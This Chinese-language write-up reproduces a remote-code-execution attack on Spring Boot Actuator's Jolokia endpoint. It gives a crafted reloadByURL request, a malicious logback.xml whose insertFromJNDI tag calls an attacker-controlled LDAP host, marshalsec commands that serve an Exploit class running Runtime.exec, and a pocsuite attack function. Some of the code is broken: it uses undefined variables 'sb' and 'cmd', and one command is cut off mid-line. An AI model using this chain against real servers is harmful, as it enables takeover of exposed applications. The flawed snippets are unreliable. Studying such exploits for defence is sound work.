<h2 align="center">spring boot actuator jolokia 漏洞复现报告</h2>

### 0x01 漏洞测试环境

一个包含 Spring Boot Actuators 的漏洞应用，该测试环境包含4个库：spring-boot-starter-web、spring-boot-starter-actuator、spring-cloud-starter-netflix-eureka-client、jolokia-core。注意该测试需要在jdk1.8.181版本或其他版本下编译运行才可以。本文使用了Java的JNDI注入，JNDI可以对接RMI服务，也可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。

不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u182、7u191、6u201之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。因此该测试环境需要在以下基本版本下编译，漏洞才生效。


### 0x02 Spring Boot Acuator介绍

Spring Boot Acuator 可以帮助你监控和管理Spring Boot应用，比如健康检查、审计、统计和HTTP追踪等。所有的这些特性可以通过JMX或者HTTP endpoints来获得。也就是说 Acuator 可以通过原生的端点(endpoint)来执行，常用的原生端点有 health、env、info，对于web应用而言，可以通过 JMX 来获得，该JMX就是jolokia。

参考资料：

- [SpringBoot命令执行漏洞分析与PoC](https://www.secrss.com/articles/9862)
- [Springboot之actuator配置不当的漏洞利用](https://www.freebuf.com/news/193509.html)

### 0x03 jolokia介绍

Jolokia是一个用来访问远程JMX MBeans的方法，它可以利用JSON通过Http实现JMX远程管理的开源项目，即允许对所有已经注册的MBean进行Http访问，具有快速、简单等特点。除了支持基本的JMX操作之外，它还提供一些独特的特性来增强JMX远程管理如：批量请求，细粒度安全策略等。

那JMX又是什么呢？
JMX：（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。

参考资料：

- [jolokia 学习心得](https://blog.csdn.net/yang382197207/article/details/12911855)
- [理解JMX之介绍和简单使用](https://blog.csdn.net/lmy86263/article/details/71037316)

### 0x04 JNDI/RMI/LDAP 介绍

N/D服务是Naming Service 和 Directory Service ，就是JNDI的命名服务和目录服务。

JNDI，JNDI即Java Naming and Directory Interface，翻译成中文就Java命令和目录接口，2016年的BlackHat大会上web议题重点讲到，JNDI提供了很多实现方式，主要有RMI，LDAP，CORBA等。

RMI, Remote Method Invocation 是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。

LDAP是开放的Internet标准，支持跨平台的Internet协议，在业界中得到广泛认可的，并且市场上或者开源社区上的大多产品都加入了对LDAP的支持，因此对于这类系统，不需单独定制，只需要通过LDAP做简单的配置就可以与服务器做认证交互。“简单粗暴”，可以大大降低重复开发和对接的成本。

marshalsec 是一个可以方便的开启 RMI 和 LDAP 服务的工具。
> 
开启rmi服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://VPS/ExportObject 1099
开启ldap服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.L

参考资料：
- [JNDI/LADP 学习](https://blog.sari3l.com/posts/469de5e6/)
- [漏洞复现丨快速开启RMI&&LDAP](https://ep.heibai.org/post/1360.html)

### 0x05  logback库中的“reloadByURL”函数详解

logback JMXConfigurator 允许通过 JMX 来配置 logback。简单来说就是，它允许你从默认配置文件，指定的文件或者 URL 重新配置 logback，列出 logger 以及修改 logger 级别。jolokia在logback JMXConfigurator中提供的“reloadByURL”方法允许我们从外部URL重新加载日志的记录配置。 对于我们来说，只需导航到以下内容即可触发：
http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml 

logback JMXConfigurator中提供以下几个操作：
- 使用默认配置文件重新加载 logback 的配置
- 通过指定的 URL 重新加载配置
- 通过指定的文件重新加载配置
- 设置指定的 logger 的级别。想要设置为 null，传递 "null" 字符串就可以
- 获取指定 logger 的级别。返回值可以为 null
- 或者指定 logger 的有效级别

在该测试中我们已经找到的Spring Boot Acuator 程序中的一个 reloadByURL 的利用点，利用该函数可以加载任意外部资源，并且具备解析xml文档的功能。那么就可以利用xml文件中 insertFromJNDI 标签，该标签可以加载任意Java类，从而实现远程Java命令执行，在16年blackhat中有一场关于N/D服务以及恶意类绑定的演讲，其中详细描述了 如何利用 JNDI 实现 Java应用程序的远程执行。

参考资料：
- [logback Chapter 10: JMX Configurator](/Users/flowerlake/Pictures/文章配图/OracleRMIAndLDAP.jpg)

### 0x06 如何找到利用点

![Screen Shot 2019-12-10 at 20.21.35](/Users/flowerlake/Desktop/Screen Shot 2019-12-10 at 20.21.35.png)
参见官网给出的文档显示，jolokia列出了所有可以被操作的Mbean。在前面我们也看到了，在http请求中，其中的一项是Mbean name。下面我们还可以从源码的角度看一下。

```java
// com.sun.jmx.interceptor.DefaultMbeanServerInterceptor.java
public Object invoke(ObjectName name, String operationName,
                         Object params[], String signature[])
            throws InstanceNotFoundException, MBeanException,
                   ReflectionException {

        name = nonDefaultDomain(name);

        DynamicMBean instance = getMBean(name);
        checkMBeanPermission(instance, operationName, name, "invoke");
        try {
            return instance.invoke(operationName, params, signature);
        } catch (Throwable t) {
            rethrowMaybeMBeanException(t);
            throw new AssertionError();
        }
    }
```

这段代码的大致意思也就明白了，就是最终执行的时候是通过getMBean这个函数来得到一个实例，然后这个实例执行后面的操作。


### 0x07  POC构造
我们大概了解了该程序的漏洞位置以及相应的原理，如何构造有效的POC还是一个漏洞利用的重点。
先看一下**JmxExecRequest**的参数：

```java
// org.jolokia.request.JmxExecRequest.java
/**
     * Constructor for creating a JmxRequest resulting from an HTTP GET request
     *
     * @param pObjectName name of MBean to execute the operation upon. Must not be null.
     * @param pOperation name of the operation to execute. Must not be null.
     * @param pArguments arguments to to used for executing the request. Can be null
     * @param pParams optional params used for processing the request.
     * @throws MalformedObjectNameException if the object name is not in proper format
     */
  JmxExecRequest(String pObjectName,String pOperation,List pArguments,
                     ProcessingParameters pParams) throws MalformedObjectNameException {
          super(RequestType.EXEC, pObjectName, null /* path is not supported for exec requests */, pParams);
          operation = pOperation;
          arguments = pArguments;
    }
```
JmxExecRequest总共有4个参数，其中pObjectName是Mbean的名称（不能为空），pOperation 是要执行的操作，不能为空，pArguments 是要执行请求的参数，可以为空，pParams是用来请求的可选参数（optional）。所以下面看一下JmxRequestFactory.createGetRequest是怎么得到 pathInfo的。

```java
// org.jolokia.http.HttpRequestHandler.java

public JSONAware handleGetRequest(String pUri, String pPathInfo, Map<String, String[]> pParameterMap) {
        String pathInfo = extractPathInfo(pUri, pPathInfo);

        JmxRequest jmxReq =
JmxRequestFactory.createGetRequest(pathInfo,getProcessingParameter(pParameterMap));
        if (backendManager.isDebug()) {
            logHandler.debug("URI: " + pUri);
            logHandler.debug("Path-Info: " + pathInfo);
            logHandler.debug("Request: " + jmxReq.toString());
        }
        return executeRequest(jmxReq);
    }
```

```java
// org.jolokia.util.EscapeUtil.java
public static final String PATH_ESCAPE = "!";
...
public static List<String> parsePath(String pPath) {
    // Special cases which simply implies 'no path'
    if (pPath == null || pPath.equals("") || pPath.equals("/")) {
    return null;
    }
		return replaceWildcardsWithNull(split(pPath, PATH_ESCAPE, "/"));
}
```
从上面两段代码中可以看到，**createGetRequest**函数最终会通过split函数来分割**pathInfo**，其中 **PATH_ESCAPE**的值为"!"，也就是说当!和/在一起的时候，!/ 会被解析为 / 。这样可以用来构造 reloadByUrl的URL值。

另外，在官网可以查询到 jolokia 的执行语法路径参数。

![Screen Shot 2019-12-10 at 19.37.16](/Users/flowerlake/Desktop/Screen Shot 2019-12-10 at 19.41.32.png)

> 该请求路径也就是 **<base url>/exec/<mbean name>/<operation name>/<arg1>/<arg2>/....** 

logback的Mbean：

![Screen Shot 2019-12-10 at 20.08.30](/Users/flowerlake/Desktop/Screen Shot 2019-12-10 at 20.08.30.png)

```xml
mbean name 为 ch.qos.logback.classic:name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/
Operation: reloadByUrl
Params: http:!/!/127.0.0.1!/logback.xml 
```

因此，最终构造出来的POC代码为：
127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByUrl/http:!/!/127.0.0.1!/logback.xml 

### 0x09 漏洞验证流程

1. 搭建一个简单的HTTP服务器，可用于下载logback.xml

2. “reloadByURL”函数从 http://127.0.0.1/logback.xml 下载新的配置并将其解析为Logback。 此恶意配置应具有以下内容：
```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3. 在易受攻击的服务器上解析此文件时，它会创建与“env-entry-name”参数值中指定的攻击者LDAP服务器的连接，从而导致JNDI进行解析。 恶意的LDAP服务器可以返回具有“引用”类型的对象，以触发在目标应用程序上执行字节码。 
4. 创建恶意类，比如实现打开计算器的操作，在构造函数 Exploit() 中写入执行代码，在恶意类加载的时候即可执行恶意代码。然后在8081端口下开启一个HTTP服务，或者使用刚才的8080端口的HTTP服务也可以。
```java
public static String exec(String command) throws Exception{
        String returnValue = "";
        BufferedInputStream inputStream = new BufferedInputStream(Runtime.getRuntime().exec(command).getInputStream());
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String lineStr = "";
        while((lineStr = bufferedReader.readLine())!=null){
            sb += lineStr + "\n";
        }
        inputStream.close();
        bufferedReader.close();
        return returnValue;   
    }
    public Exploit() throws Exception{
        String result = "";
        result = exec("open /System/Applications/Calculator.app");
        throw new Exception(exec(cmd));
    }
```

5. 开启JNDI，使用marshalsec可以很方便的开启JNDI服务
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8081/#Exploit 1389
```

6. 编写poc suite，该POC较为简单，只需要在_attack下添加一个HTTP请求即可
```
def _attack(self):
        result = {}

        payload = "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8080!/logback.xml"
        vul_url = self.url + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        r = requests.get(vul_url, headers=headers)
        if r.status_code == 200:
            result['ShellInfo'] = {}
            result['ShellInfo']['Content'] = r.text
        return self.parse_output(result)
```
最终的测试结果如下：

![Screen Shot 2019-12-10 at 22.18.04](/Users/flowerlake/Desktop/Screen Shot 2019-12-10 at 22.18.04.png)

